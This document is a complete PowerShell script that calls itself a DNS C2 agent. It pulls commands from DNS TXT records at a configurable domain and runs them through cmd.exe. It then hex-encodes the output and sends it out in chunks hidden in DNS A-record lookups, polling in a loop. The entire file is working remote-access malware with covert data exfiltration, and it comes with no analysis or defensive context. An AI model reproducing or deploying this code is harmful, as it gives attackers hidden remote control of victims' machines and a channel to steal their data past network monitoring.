$BaseDomain = "domain.com"
$CommandSubdomain = "cmd"
$DataSubdomain = "data"
$SleepTimeSeconds = 15
$ExfilChunkSize = 50

function HexEncode([string]$Text) {
    $HexString = ""
    $CharArray = $Text.ToCharArray()
    foreach ($Char in $CharArray) {
        $HexString += '{0:x2}' -f [int][char]$Char
    }
    return $HexString
}

function Do-Exfiltrate($SessionId, $CommandId, $Result) {
    Write-Host "Starting exfiltration for Session ID: $SessionId, Command ID: $CommandId" -ForegroundColor Yellow

    $HexResult = HexEncode($Result)
    Write-Host "Hex encoded length: $($HexResult.Length)" -ForegroundColor Cyan
    
    $Chunks = @()
    for ($i = 0; $i -lt $HexResult.Length; $i += $ExfilChunkSize) {
        $Remaining = $HexResult.Length - $i
        if ($Remaining -lt $ExfilChunkSize) {
            $ChunkLength = $Remaining
        } else {
            $ChunkLength = $ExfilChunkSize
        }
        $Chunks += $HexResult[$i..($i + $ChunkLength - 1)] -join ''
    }

    $TotalFragments = $Chunks.Count
    Write-Host "Total fragments to send: $TotalFragments" -ForegroundColor Cyan

    for ($i = 0; $i -lt $Chunks.Count; $i++) {
        $Chunk = $Chunks[$i]
        $SequenceNumber = $i + 1
        
        $FqdnToQuery = "$SequenceNumber-$TotalFragments-$CommandId-$Chunk.$SessionId.$DataSubdomain.$BaseDomain"
        
        $MaxRetries = 3
        $RetryCount = 0
        $Success = $false
        
        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            $RetryCount++
            Write-Host "Sending fragment $SequenceNumber/$TotalFragments (Attempt $RetryCount/$MaxRetries, CmdID: $CommandId)"
            
            try {
                $Response = Resolve-DnsName -Name $FqdnToQuery -Type A -DnsOnly -ErrorAction Stop
                $Success = $true
                Write-Host "  -> Fragment $SequenceNumber sent successfully" -ForegroundColor Green
            } catch {
                Write-Host "  -> Failed attempt $RetryCount for fragment $SequenceNumber" -ForegroundColor Red
                if ($RetryCount -lt $MaxRetries) {
                    Write-Host "  -> Retrying in 2 seconds..." -ForegroundColor Yellow
                    Start-Sleep -Seconds 2
                }
            }
        }
        
        if (-not $Success) {
            Write-Host "  -> FAILED to send fragment $SequenceNumber after $MaxRetries attempts!" -ForegroundColor Red
        }
        
        if ($i -lt ($Chunks.Count - 1)) {
            Write-Host "  -> Waiting 3 seconds before next fragment..." -ForegroundColor DarkGray
            Start-Sleep -Seconds 3
        }
    }
    
    Write-Host "Exfiltration complete." -ForegroundColor Green
}


function Get-Nonce {
    return (Get-Random -Maximum 999999).ToString()
}

function Do-CheckIn {
    $Nonce = Get-Nonce
    $CommandFqdn = "$Nonce.$CommandSubdomain.$BaseDomain"
    
    Write-Host "Checking in with FQDN: $CommandFqdn..."
    
    try {
        $DnsRecord = Resolve-DnsName -Name $CommandFqdn -Type TXT -DnsOnly -NoHostsFile -ErrorAction Stop
        
        foreach ($Record in $DnsRecord) {
            if ($Record.Type -eq "TXT") {
                $CommandPayload = $Record.Strings -join ' '
                
                if ($CommandPayload -match "^CMD:(\d+):(.*)") {
                    $CmdId = $matches[1].Trim()
                    $Command = $matches[2].Trim()
                    Write-Host "Received command ID: $CmdId, Command: $Command" -ForegroundColor Green
                    return @{ Id = $CmdId; Command = $Command }
                }
            }
        }

    } catch {
        Write-Host "Error during command check-in (likely no command available or server down)." -ForegroundColor Red
    }
    
    return $null
}

function Execute-Command($Command) {
    Write-Host "Executing: $Command" -ForegroundColor Yellow
    
    $ExecutionResult = ""
    try {
        $ExecutionResult = cmd.exe /c $Command 2>&1 | Out-String
    } catch {
        $ExecutionResult = "Error executing command: $($_.Exception.Message)"
    }
    
    return $ExecutionResult.Trim()
}

Write-Host "Starting PowerShell DNS C2 Agent..." -ForegroundColor Green

$AgentID = $env:COMPUTERNAME
Write-Host "Agent ID: $AgentID"

$LastCommandId = ""

while ($true) {
    $CheckInResult = Do-CheckIn
    
    if ($CheckInResult -and $CheckInResult.Id -ne $LastCommandId) {
        $LastCommandId = $CheckInResult.Id
        Write-Host "New command detected (ID: $LastCommandId)" -ForegroundColor Cyan
        
        $Result = Execute-Command $CheckInResult.Command
        Do-Exfiltrate $AgentID $LastCommandId $Result
    } else {
        Write-Host "No new command. Agent alive." -ForegroundColor DarkGray
    }
    
    Write-Host "Sleeping for $SleepTimeSeconds seconds..."
    Start-Sleep -Seconds $SleepTimeSeconds
}